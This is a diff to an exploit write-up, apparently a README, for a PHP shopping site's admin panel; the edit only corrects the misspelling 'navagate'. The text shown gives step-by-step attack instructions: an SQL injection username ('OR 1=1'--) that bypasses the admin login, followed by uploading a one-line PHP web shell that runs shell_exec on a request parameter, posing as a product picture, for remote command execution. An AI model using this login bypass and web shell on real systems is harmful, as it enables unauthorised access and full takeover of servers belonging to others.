@@ -15,13 +15,13 @@ The exploit utilizes multiple vulnerabilities first bypasses authentication then
 
 ## Authentication Bypass
 
-Navagate to the Admin login page: `http://<site>/shopping/admin` 
+Navigate to the Admin login page: `http://<site>/shopping/admin` 
 * Username: `'OR 1=1'--` 
 * Password: whatever
   
 ## File upload vulnerability
 
-After bypassing the authentication navagate to the "Add a new product" \
+After bypassing the authentication navigate to the "Add a new product" \
 Here insert whatever data into the fields until the picture. \
 The image file should be a php file with the command execution such the following:
   1. `<?php $exe = shell_exec($_REQUEST['cmd']); echo $exe; ?>`
